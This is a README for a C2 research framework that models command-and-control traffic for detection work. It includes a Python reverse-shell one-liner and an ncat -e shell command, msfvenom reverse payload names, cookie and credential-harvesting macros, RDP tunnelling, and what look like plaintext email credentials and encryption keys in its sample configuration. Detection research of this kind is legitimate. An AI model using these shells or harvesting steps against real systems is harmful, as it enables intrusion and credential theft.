# TheAllCommander
Framework for modeling and researching C2 communications for developing efficient filtering and detection logic.

# Why TheAllCommander?
TheAllCommander allows researchers to easily develop their own communication modules and connect them to this framework, then leverage the existing framework to test elements of the Red Team workflow through the communication protocol for further study. 
## What TheAllCommander is...
A flexible framework for studying, modeling, and testing new C2 communication protocols.
A portable framework for executing tests of an environments ability to detect non-nominal C2 traffic.  
## What TheAllCommander is not...
TheAllCommander does not natively sling exploits - this is not trying to be Metasploit.
TheAllCommander does not provide malware agents for use in an engagement - this is not trying to be Cobalt Strike. 

# Concept of Operations
The central server, TheAllCommander, receives incoming connections on a variety of communications protocols. Current, it supports HTTP, HTTPS, Email, text over TCP, and UDP (DNS traffic emulation). This allows for a single server to control local daemons over any of those protocols. TheAllCommander can be controlled from either a LocalConnection terminal based interface or TheAllCommanderFE, an Angular application developed to allow a GUI for inputing commands. All commands, listed below, are translated by TheAllCommander into a platform specific format if needed, and then transmitted to the local daemon. 

Daemons are uniquely identified by the combination of user account, hostname, and protocol. Therefore multiple daemons can exist on a target system via different protocols, or via different user permission levels.

# Interfaces
There are several key classes which are described in detail in the Javadoc for this project.

At a high level, this is the user-implementable part of the workflow: To communicate with a remote agent/exploit/etc, TheAllCommander defines an abstract class c2.C2Interface. It also implements Runnable, where the programmer will implement whatever operations are necessary to initialize communications. Communiation with the rest of TheAllCommander is facilitated with the IOManager class, which is a thread safe vehicle passed to the C2 interface on initialization. The C2Interface instance can request commands relevant to connect clients from this class, as well as pass along return communications. TheAllCommander handles routing those communications to the controlling agent.

There is also an AbstractCommandMacro class which can accept commands and translate them to more complex instructions. For example, TheAllCommander comes with two macro sets out of the box. The first of these is the CookieDeletionMacro, which allows the user to simply state the command "delete_cookies". The CookieDeletionMacro will then decompose this instruction into a series of instructions that delete Firefox, Chrome, and Edge cookies for the current user session on the target system. There is also the "harvest_cookies" macro, which instructs the remote daemon to send Firefox, Chrome, and Edge cookies to TheAllCommander.

# Daemons
Currently, TheAllCommander has been tested with the following payloads:
1) Python. Currently TheAllCommander includes a HTTPS and a UDP/DNS emulation daemon. These daemons are in no way produced for operations in a real Red Team engagement, and are developed to serve as a template for further comm development. 
2) Msfvenom unstaged tcp payloads (windows/x64/shell_reverse_tcp and linux/x86/shell_reverse_tcp)
3) "Python oneliner" ->  TheAllCommander can receive connections from python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.56.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\"/bin/sh\",\"-i\"]);'
		Note: This has been tested with /bin/sh and the $ will be removed to normalize IO with a Linux ncat shell
4) ncat <ip> <port> -e cmd | /bin/bash -> works on both Linux and Windows
5) The author has developed C++ and C# payloads which are available only for limited release. Until a framework for public release can be developed, they will be held for release on an individually assessed basis.

# Commands
ps - List all running process
pwd - Print Working Directory
getuid - prints username, user directory, and hostname
uplink (filename) - returns a file from the remote host in base64. TheAllCommanderFE will automatically allow download of the file.
<control> download (filename) (base64 file binary) - downloads file to remote host. TheAllCommanderFE allows users to select a file from the GUI and it will be automatically transferred to the daemon.
cd (directory) - changes present directory
harvest - (C# only) - Uses the data gathering from Ghostpack-Seatbelt to pull valuable data
die - Local daemon closes
screenshot (No Linux support) - Captures a screenshot, and uploads to the HARVEST directory based on hostname\username\time-tagged-file
clipboard (No Linux support) - captures the clipboard contents and uploads the contents to the HARVEST directory based on hostname-pid-username folder
cat 
	cat (filename) - reads files
	cat >(filename) - writes to file, overwriting. each line entered builds a string, then committed to the file. <done> to close, <cancel> to cancel operation
	cat >>(filename) - same as ">", except appends to file
	cat (file) > (file2) - copies file to file2, overwriting content
	cat (file) >> (file2) - appends file to file2 

## Server based macro commands
The following commands are implemented serverside, where the server translates the instructions into
commands for the daemon.
delete_cookies -> deletes cookies for Firefox, Edge (Chromium version), and Chrome on Windows	
harvest_cookies -> takes copies of cookies for Firefox, Edge (Chromium) and Chrome on Windows. Takes a copy of Firefox credential files
activate_rdp <username> -> sets up Remote Desktop access on windows platforms, as well as a chisel reverse tunnel to the server
	Only supported by C++ daemons at present.

# Default Commands
Sometimes it is desireable for daemons to automatically execute commands without human interaction on connecting for the first time with the home server. The configuration file element "hub.cmd.defaults" can be used to specify a file that contains commands to be sent automatically. There are several tags, and an example is included the "test" directory.
:all -> Applies to all daemons connecting
:user-<username> -> Applies to all users matching this username. For example, all Administrator sessions might wish to execute higher level persistence establishment
:hostname-<hostname> -> Applies to all daemons on a host. Useful if there is some steps necessary to enable commanding on a particular

# Configuration
The execCentral.bar script provides a properties file. Most of the values in this properties file do not need to be changed, however they all the user an enormous level of freedom to modify many elements of TheAllCommander's function. Key configuration elements are listed below:
daemon.port=8000 				HTTPS port
daemon.dns.port=8001			DNS/UDP emulation port
daemon.http.port=8002			HTTP port
daemon.nativeshell.port=8003	Port for text over TCP port. A single receiver is used for all text over TCP, 
								TheAllCommander dynamically detects what response is needed
daemon.lz.logger=test			This is the location the keylogger information is sent to
daemon.lz.exfil=exfil			This directory is used for wide net data exfiltration
daemon.lz.harvest=test			Harvested information, such as clipboard shots, are saved here

The following configuration elements are used to connect to an email server to send commands and receive responses
daemon.email.port=587			
daemon.email.host=mail.matthandy.net
daemon.email.username=testC2@matthandy.net
daemon.email.password=haxor#12345

When TheAllCommander sends multiple commands automatically behind the scenes to accomplish a function, it will detect error conditions at each step of this process. This is the maximum time in milliseconds that it will wait for an affirmative response. Depending on the communication mechanism used, a greater than default value might be needed
daemon.maxresponsewait=15000

The following two parameters are used to configure how often TheAllCommander checks for new text over a socket and should not need to be changed. 
daemon.responserepollinterval=500
daemon.textovertcpstaticwait=500

The "commservices" parameter accepts a comma separated list of fully qualified class names for classes that extend the abstract class c2.C2Interface. This allows the software to dynamically load any arbitrary communication protocol the user wishes to implement and supply to the framework. 
commservices=c2.http.HTTPSManager,c2.udp.DNSEndpointEmulator,c2.smtp.EmailHandler,c2.tcp.GenericTCPInitiator
The "macros" parameter accepts a comma separated list of fully qualified class names for classes that extend the AbstractCommandMacro class, which allows users to define their own complex single line commands, which TheAllCommander can the translate into discrete commands. 
macros=c2.session.macro.CookieDeletionMacro,c2.session.macro.CookieHarvesterMacro

The following configuration elements are used to toggle the use of encrypting the payload for DNS/UDP emulated traffic
wire.encrypt.toggle=true
wire.encrypt.iv=AQIDBAUGBgUEAwIBBwcHBw==
wire.encrypt.key=AQIDBAUGBwgJCgsMDQ4PEA==

# Building
TBD